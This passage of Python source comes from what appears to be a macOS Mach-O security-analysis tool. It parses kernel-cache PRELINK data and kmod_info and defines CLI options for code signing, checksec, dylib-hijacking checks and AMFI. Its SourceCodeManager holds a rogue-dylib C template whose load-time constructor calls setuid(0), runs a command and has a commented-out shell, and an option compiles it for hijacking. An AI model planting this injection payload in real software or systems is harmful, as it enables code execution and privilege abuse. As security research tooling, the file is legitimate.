        # This map is just a helper for --dump_kext so the user can specify different names for the same kext. 
        # For instance, amfi instead of AppleMobileFileIntegrity.kext
        self.kext_map = {
            'amfi' : 'applemobilefileintegrity',
            'com.apple.driver.applemobilefileintegrity' : 'applemobilefileintegrity',
            'applemobilefileintegrity.kext' : 'applemobilefileintegrity',
        }

    def loadPRELINK_INFOFromFile(self, prelink_info_filename): # Not used yet.
        ''' 
            Read PRELINK_INFO,__info section from file (with alignment).
            The last line in the dumped section plist is broken, because of alignment.
            This function remove it so the plistlib.loads work.
            It returns loaded PLIST {prelink_info_plist}.
        '''
        prelink_info_plist_bytes = self.readBytesFromFile(prelink_info_filename)
        prelink_as_bytes_without_last_line = self.removeNullBytesAlignment(prelink_info_plist_bytes)
        prelink_info_plist = plistlib.loads(prelink_as_bytes_without_last_line)
        return prelink_info_plist
    
    def calcTwoComplement64(self, value):
        ''' Convert negative int to hex representation. '''
        return hex((value + (1 << 64)) % (1 << 64))

    def removeNullBytesAlignment(self, string_as_bytes):
        ''' 
            The last line in the PLISTs and other files dumped from memory will almost always be aligned with 0x00 bytes. 
            This function:
                Detects lines in a given bytes {string_as_bytes}.
                Removes the last line.
                Returns a new {string_as_bytes}.
        '''
        decoded_string = string_as_bytes.decode('utf-8')
        decoded_string_without_last_line = decoded_string[:decoded_string.rfind('\n')]
        string_as_bytes_without_last_line = decoded_string_without_last_line.encode()
        return string_as_bytes_without_last_line

    def dumpPrelink_info(self, filename):
        ''' Dump '__PRELINK_INFO,__info' to a given file (default: 'PRELINK_info.txt') '''
        segment_name = '__PRELINK_INFO'
        section_name = '__info'
        self.dumpSection(segment_name, section_name, filename)

    def dumpPrelink_text(self, filename):
        ''' Dump '__PRELINK_TEXT,__text' to a given file (default: 'PRELINK_text.txt') '''
        segment_name = '__PRELINK_TEXT'
        section_name = '__text'
        self.dumpSection(segment_name, section_name, filename)

    def extractPRELINK_INFO_plist(self):
        ''' Extract '__PRELINK_INFO,__info' and return it. '''
        segment_name = '__PRELINK_INFO'
        section_name = '__info'
        extracted_bytes = self.extractSection(segment_name, section_name)
        return extracted_bytes

    def parsePRELINK_INFO_plist(self, kext_name):
        ''' Extract PLIST properties values from '__PRELINK_INFO,__info' section for the given {kext_name}: 
                _PrelinkBundlePath
                _PrelinkExecutableLoadAddr
                _PrelinkExecutableRelativePath
                _PrelinkExecutableSize
                _PrelinkExecutableSourceAddr
                _PrelinkKmodInfo
        '''
        #prelink_info_plist = self.loadPRELINK_INFO(prelink_info_filename) # For loading PRELINK_INFO from file
        prelink_as_bytes = self.extractPRELINK_INFO_plist()
        prelink_as_bytes_without_last_line = self.removeNullBytesAlignment(prelink_as_bytes)
        prelink_info_plist = plistlib.loads(prelink_as_bytes_without_last_line)

        kext_name = kext_name.lower()
        if kext_name in self.kext_map:
            kext_name = self.kext_map[kext_name]

        # Iterate over the parsed dictionary
        for item in prelink_info_plist['_PrelinkInfoDictionary']:
            PrelinkExecutableRelativePath = item.get('_PrelinkExecutableRelativePath', '').lower()

            # Check if the '_PrelinkExecutableRelativePath' contains {kext_name} in its path
            if  kext_name in PrelinkExecutableRelativePath:
                # Extract the desired keys and their corresponding values
                bundle_path = item.get('_PrelinkBundlePath')

                executable_load_addr = str(item.get('_PrelinkExecutableLoadAddr')).lower()
                if executable_load_addr.startswith("0x"):
                    executable_load_addr = int(executable_load_addr, 16)
                elif executable_load_addr.startswith("-"):
                    executable_load_addr = self.calcTwoComplement64(int(executable_load_addr))
                    
                executable_relative_path = item.get('_PrelinkExecutableRelativePath')
                
                executable_size = str(item.get('_PrelinkExecutableSize')).lower()
                if executable_size.startswith("0x"):
                    executable_size = int(executable_size, 16)
                elif executable_size.startswith("-"):
                    executable_size = self.calcTwoComplement64(int(executable_size))
                
                source_addr = str(item.get('_PrelinkExecutableSourceAddr')).lower()
                if source_addr.startswith("0x"):
                    source_addr = int(source_addr, 16)
                elif source_addr.startswith("-"):
                    source_addr = self.calcTwoComplement64(int(source_addr))
                
                kmod_info = str(item.get('_PrelinkKmodInfo')).lower()
                if kmod_info.startswith("0x"):
                    kmod_info = int(kmod_info, 16)
                elif kmod_info.startswith("-"):
                    kmod_info = self.calcTwoComplement64(int(kmod_info))
 
                return bundle_path, executable_load_addr, executable_relative_path, executable_size, source_addr, kmod_info

    def printParsedPRELINK_INFO_plist(self, kext_name):
        ''' Print extracted properties for PRELINK_INFO Plist for a given kext. '''
        bundle_path, executable_load_addr, executable_relative_path, executable_size, source_addr, kmod_info = self.parsePRELINK_INFO_plist(kext_name)
        print(f'_PrelinkBundlePath: {bundle_path}')
        print(f'_PrelinkExecutableLoadAddr: {executable_load_addr}')
        print(f'_PrelinkExecutableRelativePath: {executable_relative_path}')
        print(f'_PrelinkExecutableSize: {hex(int(executable_size))}')
        print(f'_PrelinkExecutableSourceAddr: {source_addr}')
        print(f'_PrelinkKmodInfo: {kmod_info}')

    def dumpKernelExtensionFromPRELINK_TEXT(self, kext_name):
        ''' Dump prelinked KEXT {kext_name} from decompressed Kernel Cache PRELINK_TEXT segment -p {file_path} to a file named: prelinked_{kext_name}.bin '''
        segment_section = '__PRELINK_TEXT,__text'

        if not self.hasSection(segment_section): # If segment does not exist - break
            print(f'Specified binary file does not have {segment_section} - the extension was not dumped.')
            return False

        _, kext_load_addr, _, kext_size, source_addr, _ = self.parsePRELINK_INFO_plist(kext_name)
        kext_load_addr = int(kext_load_addr, 16)
        kext_size = int(kext_size, 16)
        output_path = f'prelinked_{kext_name}.bin'

        kext_offset = self.calcRealAddressFromVM(kext_load_addr)
        self.dumpData(kext_offset, kext_size, output_path)

    def parsekmod_info(self, kext_name):
        ''' Parse kmod_info structure for the given {kext_name} from Kernel Cache '''
        _, _, _, _, _, kmod_info_vm_addr = self.parsePRELINK_INFO_plist(kext_name)
        kmod_info_in_file = self.calcRealAddressFromVM(kmod_info_vm_addr)
        kmod_info_size = ctypes.sizeof(AppleStructuresManager.kmod_info)
        extracted_kmod_info_bytes = self.extractBytesAtOffset(kmod_info_in_file, kmod_info_size)
        # debug +
        #Utils.printQuadWordsLittleEndian64(extracted_kmod_info_bytes)
        # debug -
        kmod_info_as_dict = AppleStructuresManager.parsekmod_info(extracted_kmod_info_bytes)
        return kmod_info_as_dict
    
    def printParsedkmod_info(self, kext_name):
        ''' Printing function for --kmod_info '''
        kmod_info_as_dict = self.parsekmod_info(kext_name)
        for k, v in kmod_info_as_dict.items():
                print(f'{k.ljust(16)}: {v}')

    def calcKextEntryPoint(self, kext_name):
        ''' Calculate the __start for the given {kext_name} Kernel Extension '''
        kmod_info_as_dict = self.parsekmod_info(kext_name)
        start = int(kmod_info_as_dict['start'], 16) & 0xFFFFFFFF
        
        kernelcache_text_segment = self.getSegment('__TEXT')
        kernelcache_text_segment_base = kernelcache_text_segment.virtual_address
        
        return start + kernelcache_text_segment_base

    def printKextEntryPoint(self, kext_name):
        ''' Printing function for --kext_entry flag. '''
        kext_entrypoint = hex(self.calcKextEntryPoint(kext_name))
        print(f'{kext_name} entrypoint: {kext_entrypoint}')

    def calcKextExitPoint(self, kext_name):
        ''' Calculate the __stop for the given {kext_name} Kernel Extension '''
        kmod_info_as_dict = self.parsekmod_info(kext_name)
        stop = int(kmod_info_as_dict['stop'], 16) & 0xFFFFFFFF

        kernelcache_text_segment = self.getSegment('__TEXT')
        kernelcache_text_segment_base = kernelcache_text_segment.virtual_address

        return stop + kernelcache_text_segment_base

    def printKextExitPoint(self, kext_name):
        ''' Printing function for --kext_exit flag. '''
        kext_exitpoint = hex(self.calcKextEntryPoint(kext_name))
        print(f'{kext_name} exitpoint: {kext_exitpoint}')

### --- ARGUMENT PARSER --- ###  
class ArgumentParser:
    def __init__(self):
        '''Class for parsing arguments from the command line. I decided to remove it from main() for additional readability and easier code maintenance in the VScode'''
        self.parser = argparse.ArgumentParser(description="Mach-O files parser for binary analysis")
        self.addGeneralArgs()
        self.addMachOArgs()
        self.addCodeSignArgs()
        self.addChecksecArgs()
        self.addDylibsArgs()
        self.addDyldArgs()
        self.addAMFIArgs()

    def addGeneralArgs(self):
        self.parser.add_argument('-p', '--path', required=True, help="Path to the Mach-O file")

    def addMachOArgs(self):
        macho_group = self.parser.add_argument_group('MACH-O ARGS')
        macho_group.add_argument('--file_type', action='store_true', help="Print binary file type")
        macho_group.add_argument('--header_flags', action='store_true', help="Print binary header flags")
        macho_group.add_argument('--endian', action='store_true', help="Print binary endianess")
        macho_group.add_argument('--header', action='store_true', help="Print binary header")
        macho_group.add_argument('--load_commands', action='store_true', help="Print binary load commands names")
        macho_group.add_argument('--has_cmd', metavar='LC_MAIN', help="Check of binary has given load command")
        macho_group.add_argument('--segments', action='store_true', help="Print binary segments in human-friendly form")
        macho_group.add_argument('--has_segment', help="Check if binary has given '__SEGMENT'", metavar='__SEGMENT')
        macho_group.add_argument('--sections', action='store_true', help="Print binary sections in human-friendly form")
        macho_group.add_argument('--has_section', help="Check if binary has given '__SEGMENT,__section'", metavar='__SEGMENT,__section')
        macho_group.add_argument('--symbols', action='store_true', help="Print all binary symbols")
        macho_group.add_argument('--imports', action='store_true', help="Print imported symbols")
        macho_group.add_argument('--exports', action='store_true', help="Print exported symbols")
        macho_group.add_argument('--imported_symbols', action='store_true', help="Print symbols imported from external libraries with dylib names")
        macho_group.add_argument('--chained_fixups', action='store_true', help="Print Chained Fixups information")
        macho_group.add_argument('--exports_trie', action='store_true', help="Print Export Trie information")
        macho_group.add_argument('--uuid', action='store_true', help="Print UUID")
        macho_group.add_argument('--main', action='store_true', help="Print entry point and stack size")
        macho_group.add_argument('--encryption_info', nargs='?',const='', help="Print encryption info if any. Optionally specify an output path to dump the encrypted data (if cryptid=0, data will be in plain text)", metavar="(optional) save_path.bytes")
        macho_group.add_argument('--strings_section', action='store_true', help="Print strings from __cstring section")
        macho_group.add_argument('--all_strings', action='store_true', help="Print strings from all sections")
        macho_group.add_argument('--save_strings', help="Parse all sections, detect strings, and save them to a file", metavar='all_strings.txt')
        macho_group.add_argument('--info', action='store_true', default=False, help="Print header, load commands, segments, sections, symbols, and strings")
        macho_group.add_argument('--dump_data', help="Dump {size} bytes starting from {offset} to a given {filename} (e.g. '0x1234,0x1000,out.bin')", metavar=('offset,size,output_path'), nargs="?")
        macho_group.add_argument('--calc_offset', help="Calculate the real address (file on disk) of the given Virtual Memory {vm_offset} (e.g. 0xfffffe000748f580)", metavar='vm_offset')

    def addCodeSignArgs(self):
        codesign_group = self.parser.add_argument_group('CODE SIGNING ARGS')
        codesign_group.add_argument('--verify_signature', action='store_true', default=False, help="Code Signature verification (if the contents of the binary have been modified)")
        codesign_group.add_argument('--cd_info', action='store_true', default=False, help="Print Code Signature information")
        codesign_group.add_argument('--cd_requirements', action='store_true', default=False, help="Print Code Signature Requirements")
        codesign_group.add_argument('--entitlements', help="Print Entitlements in a human-readable, XML, or DER format (default: human)", nargs='?', const='human', metavar='human|xml|var')
        codesign_group.add_argument('--extract_cms', help="Extract CMS Signature from the Code Signature and save it to a given file", metavar='cms_signature.der')
        codesign_group.add_argument('--extract_certificates', help="Extract Certificates and save them to a given file. To each filename will be added an index at the end:  _0 for signing, _1 for intermediate, and _2 for root CA certificate", metavar='certificate_name')
        codesign_group.add_argument('--remove_sig', help="Save the new file on a disk with removed signature", metavar='unsigned_binary')
        codesign_group.add_argument('--sign_binary', help="Sign binary using specified identity - use : 'security find-identity -v -p codesigning' to get the identity (default: adhoc)", nargs='?', const='adhoc', metavar='adhoc|identity')

    def addChecksecArgs(self):
        checksec_group = self.parser.add_argument_group('CHECKSEC ARGS')
        checksec_group.add_argument('--has_pie', action='store_true', default=False, help="Check if Position-Independent Executable (PIE) is set")
        checksec_group.add_argument('--has_arc', action='store_true', default=False, help="Check if Automatic Reference Counting (ARC) is in use (can be false positive)")
        checksec_group.add_argument('--is_stripped', action='store_true', default=False, help="Check if binary is stripped")
        checksec_group.add_argument('--has_canary', action='store_true', default=False, help="Check if Stack Canary is in use (can be false positive)")
        checksec_group.add_argument('--has_nx_stack', action='store_true', default=False, help="Check if stack is non-executable (NX stack)")
        checksec_group.add_argument('--has_nx_heap', action='store_true', default=False, help="Check if heap is non-executable (NX heap)")
        checksec_group.add_argument('--has_xn', action='store_true', default=False, help="Check if binary is protected by eXecute Never (XN) ARM protection")
        checksec_group.add_argument('--is_notarized', action='store_true', default=False, help="Check if the application is notarized and can pass the Gatekeeper verification")
        checksec_group.add_argument('--is_encrypted', action='store_true', default=False, help="Check if the application is encrypted (has LC_ENCRYPTION_INFO(_64) and cryptid set to 1)")
        checksec_group.add_argument('--is_restricted', action='store_true', default=False, help="Check if binary has __RESTRICT segment or CS_RESTRICT flag set")
        checksec_group.add_argument('--is_hr', action='store_true', default=False, help="Check if the Hardened Runtime is in use")
        checksec_group.add_argument('--is_as', action='store_true', default=False, help="Check if the App Sandbox is in use")
        checksec_group.add_argument('--is_fort', action='store_true', default=False, help="Check if the binary is fortified")
        checksec_group.add_argument('--has_rpath', action='store_true', default=False, help="Check if the binary utilise any @rpath variables")
        checksec_group.add_argument('--has_lv', action='store_true', default=False, help="Check if the binary has Library Validation (protection against Dylib Hijacking)")
        checksec_group.add_argument('--checksec', action='store_true', default=False, help="Run all checksec module options on the binary")

    def addDylibsArgs(self):
        dylibs_group = self.parser.add_argument_group('DYLIBS ARGS')
        dylibs_group.add_argument('--dylibs', action='store_true', default=False, help="Print shared libraries used by specified binary with compatibility and the current version (loading paths unresolved, like @rpath/example.dylib)")
        dylibs_group.add_argument('--rpaths', action='store_true', default=False, help="Print all paths (resolved) that @rpath can be resolved to")
        dylibs_group.add_argument('--rpaths_u', action='store_true', default=False, help="Print all paths (unresolved) that @rpath can be resolved to")
        dylibs_group.add_argument('--dylibs_paths', action='store_true', default=False, help="Print absolute dylib loading paths (resolved @rpath|@executable_path|@loader_path) in order they are searched for")
        dylibs_group.add_argument('--dylibs_paths_u', action='store_true', default=False, help="Print unresolved dylib loading paths.")
        dylibs_group.add_argument('--broken_relative_paths', action='store_true', default=False, help="Print 'broken' relative paths from the binary (cases where the dylib source is specified for an executable directory without @executable_path)")
        dylibs_group.add_argument('--dylibtree', metavar=('cache_path,output_path,is_extracted'), nargs = '?', const=",,0", help='Print the dynamic dependencies of a Mach-O binary recursively. You can specify the Dyld Shared Cache path in the first argument, the output directory as the 2nd argument, and if you have already extracted DSC in the 3rd argument (0 or 1). The output_path will be used as a base for dylibtree. For example, to not extract DSC, use: --dylibs ",,1", or to extract from default to default use just --dylibs or --dylibs ",,0" which will extract DSC to extracted_dyld_share_cache/ in the current directory')
        dylibs_group.add_argument('--dylib_id', action='store_true', default=False, help="Print path from LC_ID_DYLIB")
        dylibs_group.add_argument('--reexport_paths', action='store_true', default=False, help="Print paths from LC_REEXPORT_DLIB")
        dylibs_group.add_argument('--hijack_sec', action='store_true', default=False, help="Check if binary is protected against Dylib Hijacking")
        dylibs_group.add_argument('--dylib_hijacking', metavar='(optional) cache_path' ,nargs="?", const="default", help="Check for possible Direct and Indirect Dylib Hijacking loading paths. The output is printed to console and saved in JSON format to /tmp/dylib_hijacking_log.json(append mode). Optionally, specify the path to the Dyld Shared Cache")
        dylibs_group.add_argument('--dylib_hijacking_a', metavar='cache_path', nargs="?", const="default", help="Like --dylib_hijacking, but shows only possible vectors (without protected binaries)")
        dylibs_group.add_argument('--prepare_dylib', metavar='(optional) target_dylib_name', nargs="?", const='', help="Compile rogue dylib. Optionally, specify target_dylib_path, it will search for the imported symbols from it in the dylib specified in the --path argument and automatically add it to the source code of the rogue lib. Example: --path lib1.dylib --prepare_dylib /path/to/lib2.dylib")

    def addDyldArgs(self):
        dyld_group = self.parser.add_argument_group('DYLD ARGS')
        dyld_group.add_argument('--is_built_for_sim', action='store_true', default=False, help="Check if binary is built for simulator platform.")
        dyld_group.add_argument('--get_dyld_env', action='store_true', default=False, help="Extract Dyld environment variables from the loader binary.")
        dyld_group.add_argument('--compiled_with_dyld_env', action='store_true', default=False, help="Check if binary was compiled with -dyld_env flag and print the environment variables and its values.")
        dyld_group.add_argument('--has_interposing', action='store_true', default=False, help="Check if binary has interposing sections.")
        dyld_group.add_argument('--interposing_symbols', action='store_true', default=False, help="Print interposing symbols if any.")

    def addAMFIArgs(self):
        dyld_group = self.parser.add_argument_group('AMFI ARGS')
        dyld_group.add_argument('--dump_prelink_info', metavar='(optional) out_name', nargs="?", const='PRELINK_info.txt', help='Dump "__PRELINK_INFO,__info" to a given file (default: "PRELINK_info.txt")')
        dyld_group.add_argument('--dump_prelink_text', metavar='(optional) out_name', nargs="?", const='PRELINK_text.txt', help='Dump "__PRELINK_TEXT,__text" to a given file (default: "PRELINK_text.txt")')
        dyld_group.add_argument('--dump_prelink_kext', metavar='kext_name', nargs="?", help='Dump prelinked KEXT {kext_name} from decompressed Kernel Cache PRELINK_TEXT segment to a file named: prelinked_{kext_name}.bin')
        dyld_group.add_argument('--kext_prelinkinfo', metavar='kext_name', nargs="?", help='Print _Prelink properties from PRELINK_INFO,__info for a give {kext_name}')
        dyld_group.add_argument('--kmod_info', metavar='kext_name', help="Parse kmod_info structure for the given {kext_name} from Kernel Cache")
        dyld_group.add_argument('--kext_entry', metavar='kext_name', help="Calculate the virtual memory address of the __start (entrpoint) for the given {kext_name} Kernel Extension")
        dyld_group.add_argument('--kext_exit', metavar='kext_name', help="Calculate the virtual memory address of the __stop (exitpoint) for the given {kext_name} Kernel Extension")
        dyld_group.add_argument('--amfi', help="a")



    def parseArgs(self):
        return self.parser.parse_args()

    def printAllArgs(self, args):
        '''Just for debugging. This method is a utility designed to print all parsed arguments and their corresponding values.'''
        for arg, value in vars(args).items():
            print(f"{arg}: {value}")

### --- SOURCE CODE --- ### 
class SourceCodeManager:
    dylib_hijacking = r'''
// clang -dynamiclib m.c -o m.dylib //-o $PWD/TARGET_DYLIB 
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
    syslog(LOG_ERR, "[+] m.dylib injected in %s\n", argv[0]);
    printf("[+] m.dylib injected in %s\n", argv[0]);
    setuid(0);
    system("id");
    //system("/bin/sh");
}
'''
    @staticmethod
    def clangCompilerWrapper(file_name_c, source_code, output_filename, flag_list=None):
        # Save the source code to a file
        with open(file_name_c, "w") as source_file:
            source_file.write(source_code)

        # Compile the source code using clang
        clang_command = ["clang", file_name_c, "-o", output_filename, *flag_list]
        subprocess.run(clang_command, check=True)

### --- APPLE CODE --- ### 
class AppleStructuresManager:
    ''' It stores Apple structures and their parsers. '''
    class kmod_info(ctypes.Structure):
        ''' REF: https://github.com/apple-oss-distributions/xnu/blob/1031c584a5e37aff177559b9f69dbd3c8c3fd30a/osfmk/mach/kmod.h#L87 '''
        _pack_ = 1 # Specify the byte order (little-endian)
        _fields_ = [
            ("next", ctypes.c_uint64), # Simplifying the structure, it should be: struct kmod_info  * next;
            ("info_version", ctypes.c_int32),
            ("id", ctypes.c_uint32),
            ("name", ctypes.c_char * 64),
            ("version", ctypes.c_char * 64),
            ("reference_count", ctypes.c_int32),
            ("reference_list", ctypes.c_uint64),
            ("address", ctypes.c_uint64),
            ("size", ctypes.c_uint64),
            ("hdr_size", ctypes.c_uint64),
            ("start", ctypes.c_uint64),
            ("stop", ctypes.c_uint64)
        ]

    def parsekmod_info(data):
        # Create an instance of the kmod_info structure
        info = AppleStructuresManager.kmod_info()
        # Cast the binary data to the structure
        ctypes.memmove(ctypes.byref(info), data, ctypes.sizeof(info))

        # Convert name and version to strings
        name = info.name.decode('utf-8').rstrip('\x00')
        version = info.version.decode('utf-8').rstrip('\x00')

        # Return parsed data as a dictionary
        return {
            "next": info.next,
            "info_version": info.info_version,
            "id": hex(info.id),
            "name": name,
            "version": version,
            "reference_count": info.reference_count,
            "reference_list": hex(info.reference_list),
            "address": hex(info.address),
            "size": hex(info.size),
            "hdr_size": hex(info.hdr_size),
            "start": hex(info.start),
            "stop": hex(info.stop)
        }

### --- UTILS / DEBUG --- ###
class Utils:
    def printQuadWordsLittleEndian64(byte_string, columns=2):
        ''' Print Q values from given {byte_string} in {columns} columns (default 2) 
            0000000000000000 FFFFFFFF00000001
            6C7070612E6D6F63 7265766972642E65
        '''
        # Ensure the byte string length is a multiple of 8
        while len(byte_string) % 8 != 0:
            byte_string += b'\x00'  # Add padding to make it divisible by 8
        
        # Convert the byte string to a list of integers
        byte_list = list(byte_string)
        
        # Group the bytes into 8-byte chunks
        chunks = [byte_list[i:i+8] for i in range(0, len(byte_list), 8)]
        
        # Print the raw bytes in 64-bit little-endian order
        print("Raw bytes (64-bit little-endian):")
        i = 1
        for chunk in chunks:
            chunk_value = int.from_bytes(chunk, byteorder='little')
            if i < columns:
                print(f"{chunk_value:016X}", end=" ")
            else:
                print(f"{chunk_value:016X}", end="\n")
                i = 0
            i+=1
        print()

    def printRawHex(byte_string):
        ''' 
            Print bytes as raw hexes (without endianess). 
            01 00 00 00 ff ff ...
        '''
        hex_string = ' '.join(f'{byte:02x}' for byte in byte_string)
        print(hex_string)

        
if __name__ == "__main__":
    arg_parser = ArgumentParser()
    args = arg_parser.parseArgs()

    file_path = os.path.abspath(args.path)

    ### --- I. MACH-O --- ###
    macho_processor = MachOProcessor(file_path)
    macho_processor.process(args)

    ### --- II. CODE SIGNING --- ###
    code_signing_processor = CodeSigningProcessor()
    code_signing_processor.process(args)

    ### --- III. CHECKSEC --- ###
    checksec_processor = ChecksecProcessor()
    checksec_processor.process(args)

    ### --- IV. DYLIBS --- ###
    dylibs_processor = DylibsProcessor()
    dylibs_processor.process(args)

    ### --- V. DYLD --- ###
    dyld_processor = DyldProcessor()
    dyld_processor.process(args)
    
    ### --- VI. AMFI --- ###
    amfi_processor = AMFIProcessor()
    amfi_processor.process(args)
